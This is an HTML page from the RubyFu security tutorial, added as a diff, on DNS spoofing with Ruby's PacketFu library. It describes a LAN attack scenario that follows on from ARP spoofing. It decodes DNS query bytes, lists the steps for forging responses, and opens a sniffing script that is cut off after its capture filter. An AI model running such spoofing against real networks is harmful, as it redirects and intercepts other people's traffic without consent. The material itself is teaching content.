@@ -1,0 +1,1694 @@
+<!DOCTYPE HTML>
+<html lang="en" >
+    
+    <head>
+        
+        <meta charset="UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <title>DNS Spoofing | RubyFu</title>
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 2.6.2">
+        
+        
+        <meta name="HandheldFriendly" content="true"/>
+        <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+        <meta name="apple-mobile-web-app-capable" content="yes">
+        <meta name="apple-mobile-web-app-status-bar-style" content="black">
+        <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
+        <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">
+        
+    <link rel="stylesheet" href="../gitbook/style.css">
+    
+        
+        <link rel="stylesheet" href="../gitbook/plugins/gitbook-plugin-anchors/plugin.css">
+        
+    
+        
+        <link rel="stylesheet" href="../gitbook/plugins/gitbook-plugin-splitter/splitter.css">
+        
+    
+        
+        <link rel="stylesheet" href="../gitbook/plugins/gitbook-plugin-expandable-chapters/expandable-chapters.css">
+        
+    
+        
+        <link rel="stylesheet" href="../gitbook/plugins/gitbook-plugin-highlight/website.css">
+        
+    
+        
+        <link rel="stylesheet" href="../gitbook/plugins/gitbook-plugin-search/search.css">
+        
+    
+        
+        <link rel="stylesheet" href="../gitbook/plugins/gitbook-plugin-fontsettings/website.css">
+        
+    
+    
+        <link rel="stylesheet" href="../styles/website.css">
+    
+
+        
+    
+    
+    <link rel="next" href="../module_0x4__web_kung_fu/index.html" />
+    
+    
+    <link rel="prev" href="../module_0x3__network_kung_fu/arp_spoofing.html" />
+    
+
+        <script type="text/javascript" src="../styles/header.js"></script>
+    </head>
+    <body>
+        
+        
+    <div class="book"
+        data-level="3.10.2"
+        data-chapter-title="DNS Spoofing"
+        data-filepath="module_0x3__network_kung_fu/dns_spoofing.md"
+        data-basepath=".."
+        data-revision="Sat Jan 23 2016 22:14:52 GMT+0300 (AST)"
+        data-innerlanguage="">
+    
+
+<div class="book-summary">
+    <nav role="navigation">
+        <ul class="summary">
+            
+            
+            
+            
+
+            
+
+            
+    
+        <li class="chapter " data-level="0" data-path="index.html">
+            
+                
+                    <a href="../index.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                        Module 0x0 | Introduction
+                    </a>
+            
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="0.1" data-path="contribution.html">
+            
+                
+                    <a href="../contribution.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>0.1.</b>
+                        
+                        Contribution
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="0.2" data-path="beginners.html">
+            
+                
+                    <a href="../beginners.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>0.2.</b>
+                        
+                        Beginners
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="0.3" data-path="required_gems.html">
+            
+                
+                    <a href="../required_gems.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>0.3.</b>
+                        
+                        Required Gems
+                    </a>
+            
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1" data-path="module_0x1__basic_ruby_kung_fu/index.html">
+            
+                
+                    <a href="../module_0x1__basic_ruby_kung_fu/index.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>1.</b>
+                        
+                        Module 0x1 | Basic Ruby Kung Fu
+                    </a>
+            
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.1" data-path="module_0x1__basic_ruby_kung_fu/string.html">
+            
+                
+                    <a href="../module_0x1__basic_ruby_kung_fu/string.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>1.1.</b>
+                        
+                        String
+                    </a>
+            
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.1.1" data-path="module_0x1__basic_ruby_kung_fu/conversion.html">
+            
+                
+                    <a href="../module_0x1__basic_ruby_kung_fu/conversion.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>1.1.1.</b>
+                        
+                        Conversion
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="1.1.2" data-path="module_0x1__basic_ruby_kung_fu/extraction.html">
+            
+                
+                    <a href="../module_0x1__basic_ruby_kung_fu/extraction.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>1.1.2.</b>
+                        
+                        Extraction
+                    </a>
+            
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="module_0x1__basic_ruby_kung_fu/array.html">
+            
+                
+                    <a href="../module_0x1__basic_ruby_kung_fu/array.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>1.2.</b>
+                        
+                        Array
+                    </a>
+            
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2" data-path="module_0x2__system_kung_fu/index.html">
+            
+                
+                    <a href="../module_0x2__system_kung_fu/index.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>2.</b>
+                        
+                        Module 0x2 | System Kung Fu
+                    </a>
+            
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.1" data-path="module_0x2__system_kung_fu/command_execution.html">
+            
+                
+                    <a href="../module_0x2__system_kung_fu/command_execution.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>2.1.</b>
+                        
+                        Command Execution
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2" data-path="module_0x2__system_kung_fu/file_manipulation.html">
+            
+                
+                    <a href="../module_0x2__system_kung_fu/file_manipulation.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>2.2.</b>
+                        
+                        File manipulation
+                    </a>
+            
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.2.1" data-path="module_0x2__system_kung_fu/parsing_html,_xml,_json.html">
+            
+                
+                    <a href="../module_0x2__system_kung_fu/parsing_html,_xml,_json.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>2.2.1.</b>
+                        
+                        Parsing HTML, XML, JSON
+                    </a>
+            
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.3" data-path="module_0x2__system_kung_fu/cryptography.html">
+            
+                
+                    <a href="../module_0x2__system_kung_fu/cryptography.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>2.3.</b>
+                        
+                        Cryptography
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4" data-path="module_0x2__system_kung_fu/system_shell.html">
+            
+                
+                    <a href="../module_0x2__system_kung_fu/system_shell.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>2.4.</b>
+                        
+                        Remote Shell
+                    </a>
+            
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.4.1" data-path="module_0x2__system_kung_fu/ncatrb.html">
+            
+                
+                    <a href="../module_0x2__system_kung_fu/ncatrb.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>2.4.1.</b>
+                        
+                        Ncat.rb
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4.2" data-path="module_0x2__system_kung_fu/rce_as_a_service.html">
+            
+                
+                    <a href="../module_0x2__system_kung_fu/rce_as_a_service.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>2.4.2.</b>
+                        
+                        RCE as a Service
+                    </a>
+            
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.5" data-path="module_0x2__system_kung_fu/virustotal.html">
+            
+                
+                    <a href="../module_0x2__system_kung_fu/virustotal.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>2.5.</b>
+                        
+                        VirusTotal
+                    </a>
+            
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="3" data-path="module_0x3__network_kung_fu/index.html">
+            
+                
+                    <a href="../module_0x3__network_kung_fu/index.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>3.</b>
+                        
+                        Module 0x3 | Network Kung Fu
+                    </a>
+            
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="3.1" data-path="module_0x3__network_kung_fu/ruby_socket.html">
+            
+                
+                    <a href="../module_0x3__network_kung_fu/ruby_socket.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>3.1.</b>
+                        
+                        Ruby Socket
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="3.2" data-path="module_0x3__network_kung_fu/ssid_finder.html">
+            
+                
+                    <a href="../module_0x3__network_kung_fu/ssid_finder.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>3.2.</b>
+                        
+                        SSID Finder
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="3.3" data-path="module_0x3__network_kung_fu/ftp.html">
+            
+                
+                    <a href="../module_0x3__network_kung_fu/ftp.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>3.3.</b>
+                        
+                        FTP
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="3.4" data-path="module_0x3__network_kung_fu/ssh.html">
+            
+                
+                    <a href="../module_0x3__network_kung_fu/ssh.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>3.4.</b>
+                        
+                        SSH
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="3.5" data-path="module_0x2__system_kung_fu/email.html">
+            
+                
+                    <a href="../module_0x2__system_kung_fu/email.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>3.5.</b>
+                        
+                        Email
+                    </a>
+            
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="3.5.1" data-path="module_0x2__system_kung_fu/smtp_enumeration.html">
+            
+                
+                    <a href="../module_0x2__system_kung_fu/smtp_enumeration.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>3.5.1.</b>
+                        
+                        SMTP Enumeration
+                    </a>
+            
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="3.6" data-path="module_0x3__network_kung_fu/network_scanning.html">
+            
+                
+                    <a href="../module_0x3__network_kung_fu/network_scanning.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>3.6.</b>
+                        
+                        Network Scanning
+                    </a>
+            
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="3.6.1" data-path="module_0x3__network_kung_fu/nmap.html">
+            
+                
+                    <a href="../module_0x3__network_kung_fu/nmap.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>3.6.1.</b>
+                        
+                        Nmap
+                    </a>
+            
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="3.7" data-path="module_0x3__network_kung_fu/dns.html">
+            
+                
+                    <a href="../module_0x3__network_kung_fu/dns.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>3.7.</b>
+                        
+                        DNS
+                    </a>
+            
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="3.7.1" data-path="module_0x3__network_kung_fu/dns_enumeration.html">
+            
+                
+                    <a href="../module_0x3__network_kung_fu/dns_enumeration.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>3.7.1.</b>
+                        
+                        DNS Enumeration
+                    </a>
+            
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="3.8" data-path="module_0x3__network_kung_fu/snmp_enumeration.html">
+            
+                
+                    <a href="../module_0x3__network_kung_fu/snmp_enumeration.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>3.8.</b>
+                        
+                        SNMP Enumeration
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="3.9" data-path="module_0x3__network_kung_fu/tns_enumeration.html">
+            
+                
+                    <a href="../module_0x3__network_kung_fu/tns_enumeration.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>3.9.</b>
+                        
+                        Oracle TNS Enumeration
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="3.10" data-path="module_0x3__network_kung_fu/packet_manipulation.html">
+            
+                
+                    <a href="../module_0x3__network_kung_fu/packet_manipulation.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>3.10.</b>
+                        
+                        Packet manipulation
+                    </a>
+            
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="3.10.1" data-path="module_0x3__network_kung_fu/arp_spoofing.html">
+            
+                
+                    <a href="../module_0x3__network_kung_fu/arp_spoofing.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>3.10.1.</b>
+                        
+                        ARP Spoofing
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter active" data-level="3.10.2" data-path="module_0x3__network_kung_fu/dns_spoofing.html">
+            
+                
+                    <a href="../module_0x3__network_kung_fu/dns_spoofing.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>3.10.2.</b>
+                        
+                        DNS Spoofing
+                    </a>
+            
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="4" data-path="module_0x4__web_kung_fu/index.html">
+            
+                
+                    <a href="../module_0x4__web_kung_fu/index.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>4.</b>
+                        
+                        Module 0x4 | Web Kung Fu
+                    </a>
+            
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="4.1" data-path="module_0x4__web_kung_fu/sql_injection_scanner.html">
+            
+                
+                    <a href="../module_0x4__web_kung_fu/sql_injection_scanner.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>4.1.</b>
+                        
+                        SQL Injection Scanner
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="4.2" data-path="module_0x4__web_kung_fu/databases.html">
+            
+                
+                    <a href="../module_0x4__web_kung_fu/databases.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>4.2.</b>
+                        
+                        Databases
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="4.3" data-path="module_0x4__web_kung_fu/extending_burpsuite.html">
+            
+                
+                    <a href="../module_0x4__web_kung_fu/extending_burpsuite.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>4.3.</b>
+                        
+                        Extending Burp Suite
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="4.4" data-path="module_0x4__web_kung_fu/browser_manipulation.html">
+            
+                
+                    <a href="../module_0x4__web_kung_fu/browser_manipulation.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>4.4.</b>
+                        
+                        Browser Manipulation
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="4.5" data-path="module_0x4__web_kung_fu/web_servcies_and_apis.html">
+            
+                
+                    <a href="../module_0x4__web_kung_fu/web_servcies_and_apis.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>4.5.</b>
+                        
+                        Web Services and APIs
+                    </a>
+            
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="4.5.1" data-path="module_0x4__web_kung_fu/web_services.html">
+            
+                
+                    <a href="../module_0x4__web_kung_fu/web_services.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>4.5.1.</b>
+                        
+                        Interacting with Web Services
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="4.5.2" data-path="module_0x4__web_kung_fu/interacting_with_apis.html">
+            
+                
+                    <a href="../module_0x4__web_kung_fu/interacting_with_apis.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>4.5.2.</b>
+                        
+                        Interacting with APIs
+                    </a>
+            
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="4.5.2.1" data-path="module_0x4__web_kung_fu/wordpress_api.html">
+            
+                
+                    <a href="../module_0x4__web_kung_fu/wordpress_api.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>4.5.2.1.</b>
+                        
+                        WordPress API
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="4.5.2.2" data-path="module_0x4__web_kung_fu/twitter_api.html">
+            
+                
+                    <a href="../module_0x4__web_kung_fu/twitter_api.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>4.5.2.2.</b>
+                        
+                        Twitter API
+                    </a>
+            
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="4.6" data-path="module_0x4__web_kung_fu/ruby2javascript.html">
+            
+                
+                    <a href="../module_0x4__web_kung_fu/ruby2javascript.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>4.6.</b>
+                        
+                        Ruby 2 JavaScript
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="4.7" data-path="module_0x4__web_kung_fu/web_server_and_proxy.html">
+            
+                
+                    <a href="../module_0x4__web_kung_fu/web_server_and_proxy.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>4.7.</b>
+                        
+                        Web Server and Proxy
+                    </a>
+            
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="5" data-path="module_0x5__exploitation_kung_fu/index.html">
+            
+                
+                    <a href="../module_0x5__exploitation_kung_fu/index.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>5.</b>
+                        
+                        Module 0x5 | Exploitation Kung Fu
+                    </a>
+            
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="5.1" data-path="module_0x5__exploitation_kung_fu/fuzzer.html">
+            
+                
+                    <a href="../module_0x5__exploitation_kung_fu/fuzzer.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>5.1.</b>
+                        
+                        Fuzzer
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="5.2" data-path="module_0x5__exploitation_kung_fu/metasploit.html">
+            
+                
+                    <a href="../module_0x5__exploitation_kung_fu/metasploit.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>5.2.</b>
+                        
+                        Metasploit
+                    </a>
+            
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="5.2.1" data-path="module_0x5__exploitation_kung_fu/auxiliary_module.html">
+            
+                
+                    <a href="../module_0x5__exploitation_kung_fu/auxiliary_module.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>5.2.1.</b>
+                        
+                        Auxiliary module
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="5.2.2" data-path="module_0x5__exploitation_kung_fu/exploit_module.html">
+            
+                
+                    <a href="../module_0x5__exploitation_kung_fu/exploit_module.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>5.2.2.</b>
+                        
+                        Exploit module
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="5.2.3" data-path="module_0x5__exploitation_kung_fu/meterpreter.html">
+            
+                
+                    <a href="../module_0x5__exploitation_kung_fu/meterpreter.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>5.2.3.</b>
+                        
+                        Meterpreter
+                    </a>
+            
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="5.2.3.1" data-path="module_0x5__exploitation_kung_fu/extensions.html">
+            
+                
+                    <a href="../module_0x5__exploitation_kung_fu/extensions.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>5.2.3.1.</b>
+                        
+                        API and Extensions
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="5.2.3.2" data-path="module_0x5__exploitation_kung_fu/meterpreter_scripting.html">
+            
+                
+                    <a href="../module_0x5__exploitation_kung_fu/meterpreter_scripting.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>5.2.3.2.</b>
+                        
+                        Meterpreter Scripting
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="5.2.3.3" data-path="module_0x5__exploitation_kung_fu/railgun_api_extension.html">
+            
+                
+                    <a href="../module_0x5__exploitation_kung_fu/railgun_api_extension.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>5.2.3.3.</b>
+                        
+                        Railgun API Extension
+                    </a>
+            
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="5.3" data-path="module_0x5__exploitation_kung_fu/metasm.html">
+            
+                
+                    <a href="../module_0x5__exploitation_kung_fu/metasm.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>5.3.</b>
+                        
+                        metasm
+                    </a>
+            
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="6" data-path="module_0x6__forensic/index.html">
+            
+                
+                    <a href="../module_0x6__forensic/index.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>6.</b>
+                        
+                        Module 0x6 | Forensic Kung Fu
+                    </a>
+            
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="6.1" data-path="module_0x6__forensic/windows_forensic.html">
+            
+                
+                    <a href="../module_0x6__forensic/windows_forensic.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>6.1.</b>
+                        
+                        Windows Forensic
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="6.2" data-path="module_0x6__forensic/android_forensic.html">
+            
+                
+                    <a href="../module_0x6__forensic/android_forensic.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>6.2.</b>
+                        
+                        Android Forensic
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="6.3" data-path="module_0x3__network_kung_fu/network_traffic_analysis.html">
+            
+                
+                    <a href="../module_0x3__network_kung_fu/network_traffic_analysis.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>6.3.</b>
+                        
+                        Network Traffic Analysis
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="6.4" data-path="module_0x6__forensic/parsing_log_files.html">
+            
+                
+                    <a href="../module_0x6__forensic/parsing_log_files.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>6.4.</b>
+                        
+                        Parsing Log Files
+                    </a>
+            
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="7" data-path="references/index.html">
+            
+                
+                    <a href="../references/index.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>7.</b>
+                        
+                        References
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="8" data-path="faqs/index.html">
+            
+                
+                    <a href="../faqs/index.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>8.</b>
+                        
+                        FAQs
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="9" data-path="contributors/index.html">
+            
+                
+                    <a href="../contributors/index.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>9.</b>
+                        
+                        Contributors
+                    </a>
+            
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="9.1" data-path="contributors/todo.html">
+            
+                
+                    <a href="../contributors/todo.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>9.1.</b>
+                        
+                        TODO
+                    </a>
+            
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+
+            
+            <li class="divider"></li>
+            <li>
+                <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+                    Published with GitBook
+                </a>
+            </li>
+            
+        </ul>
+    </nav>
+</div>
+
+    <div class="book-body">
+        <div class="body-inner">
+            <div class="book-header" role="navigation">
+    <!-- Actions Left -->
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="../" >RubyFu</a>
+    </h1>
+</div>
+
+            <div class="page-wrapper" tabindex="-1" role="main">
+                <div class="page-inner">
+                
+                
+                    <section class="normal" id="section-">
+                    
+                        <h1 id="dns-spoofing"><a name="dns-spoofing" class="plugin-anchor" href="#dns-spoofing"><span class="fa fa-link"></span></a>DNS Spoofing</h1>
+<p>Continuing our attack through <a href="module_0x4__network_kung_fu/arp_spoofing.md">ARP Spoofing</a>, we want to change the victim&apos;s DNS request to whatever destination we like.</p>
+<h3 id="scenario"><a name="scenario" class="plugin-anchor" href="#scenario"><span class="fa fa-link"></span></a>Scenario</h3>
+<pre><code>                |Attacker|
+                    | AttackerSite
+                    &#x667;                      AttackerSite
+|Victim| ----------/ \----------&gt; |Router| ----------&gt; Internet
+          AnySite      AttackerSite
+</code></pre><blockquote>
+<p>Keep the ARP spoof attack running</p>
+</blockquote>
+<p>The same IPs of ARP spoof attack</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">Host</th>
+<th style="text-align:center">IP Address</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">Attacker</td>
+<td style="text-align:center">192.168.0.100</td>
+</tr>
+<tr>
+<td style="text-align:center">Victim</td>
+<td style="text-align:center">192.168.0.21</td>
+</tr>
+<tr>
+<td style="text-align:center">Router</td>
+<td style="text-align:center">192.168.0.1</td>
+</tr>
+</tbody>
+</table>
+<p>Now we cant intercept DNS Query packet coming from victim&apos;s machine. Since PacketFu supports filters in capturing (to reduce mount of captured packets) we&apos;ll use <code>udp and port 53 and host</code> filter, then we&apos;ll inspect the captured packet to ensure that it&apos;s a query then find the requested domain. <a href="../files/module03/dns_spoofing_dns-req_res.pcap.pcapng"><strong>Download DNS packet</strong></a>.</p>
+<p>From Wireshark, if we take a deeper look at the DNS query payload in <code>Domain Name System (query)</code>, we can see its been presented in hexadecimal format.</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center"><img src="../images/module03/dns_spoofing_wireshark1.png" alt="Wireshark"></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center"><strong>Figure 1.</strong> DNS query Payload</td>
+</tr>
+</tbody>
+</table>
+<p>Let&apos;s to anatomize our payload</p>
+<pre><code>0000   e7 1d 01 00 00 01 00 00 00 00 00 00 07 74 77 69
+0010   74 74 65 72 03 63 6f 6d 00 00 01 00 01
+</code></pre><ul>
+<li>The First 2 bytes is the <strong>Transaction ID</strong> and we don&apos;t care about it for now. (Our case: <code>\xe7\x1d</code>)</li>
+<li>The next 2 bytes is the <strong>Flags</strong><sup><a href="#fn_3" id="reffn_3">3</a></sup>. (We need: <code>\x01\x00</code> = \x10)</li>
+<li>Furthermore, in <strong>Queries</strong> section which contains</li>
+</ul>
+<pre><code>0000   07 74 77 69 74 74 65 72 03 63 6f 6d 00 00 01 00
+0010   01
+</code></pre><ul>
+<li><p>The <strong>Queries</strong> starts at <em>13 byte</em> of the payload.</p>
+<ul>
+<li><p>The 13th byte specifies the length of the domain name <em>before</em> the <em>very first dot</em> (without last dot com or whatever the top domain is). (Our case: <code>\x07</code>)
+  <strong>Try:</strong><code>[%w{ 74 77 69 74 74 65 72 }.join].pack(&quot;H*&quot;)</code></p>
+<ul>
+<li>Notice The domain name of &quot;twitter.com&quot; equals <code>\x07</code> but &quot;www.twitter.com&quot; equals <code>\x03</code> the same consideration for subdomains</li>
+<li><p>Each dot after first dot will be replaced with the length of the followed characters</p>
+<p><strong>e.g.</strong> www.google.co.uk</p>
+<ul>
+<li>First length (<strong>www</strong>)  =&gt; will be replaced with <code>\x03</code></li>
+<li>First dot(<strong>.google</strong>) =&gt; will be replaced with <code>\x06</code></li>
+<li>Second dot(<strong>.co</strong>)    =&gt; will be replaced with <code>\x02</code></li>
+<li>Third dot(<strong>.uk</strong>)     =&gt; will be replaced with <code>\x02</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>The very end of the domain name string is terminated by a <code>\x00</code>.</p>
+</li>
+<li>The next 2 bytes refers to the <strong>type of the query</strong><sup><a href="#fn_4" id="reffn_4">4</a></sup>. (Our case: <code>\x00\x01</code>)</li>
+</ul>
+</li>
+</ul>
+<p><strong>Now what?!</strong></p>
+<ul>
+<li>We need to start capturing/sniffing on specific interface</li>
+<li>We need to enable promiscuous mode on our interface</li>
+<li>We need to capture UDP packets on port 53 only</li>
+<li>We need parse/analyze the valid UDP packets only</li>
+<li>We need to make sure this packet is a DNS query</li>
+<li>We need to get the queried/requested domain<ul>
+<li>We need to know the domain length</li>
+<li>We need to get the FQDN</li>
+</ul>
+</li>
+<li>Build a DNS response</li>
+<li>Replace the requested domain with any domain we want</li>
+<li>Re inject the packet into victim connection and send</li>
+</ul>
+<p>I&apos;ll divide our tasks then wrap it up in one script</p>
+<pre><code class="lang-ruby"><span class="hljs-comment">#!/usr/bin/env ruby</span>
+<span class="hljs-comment">#</span>
+<span class="hljs-keyword">require</span> <span class="hljs-string">&apos;packetfu&apos;</span>
+
+<span class="hljs-keyword">include</span> <span class="hljs-constant">PacketFu</span>
+
+<span class="hljs-comment">#</span>
+<span class="hljs-comment"># * We need to start capturing/sniffing on specific interface</span>
+<span class="hljs-comment"># * We need to enable promiscuous mode on our interface</span>
+<span class="hljs-comment"># * We need to capture UDP packets on port 53 only</span>
+<span class="hljs-comment">#</span>
+filter = <span class="hljs-string">&quot;udp and port 53 and host &quot;</span> + <span class="hljs-string">&quot;192.168.0.21&quot;</span>
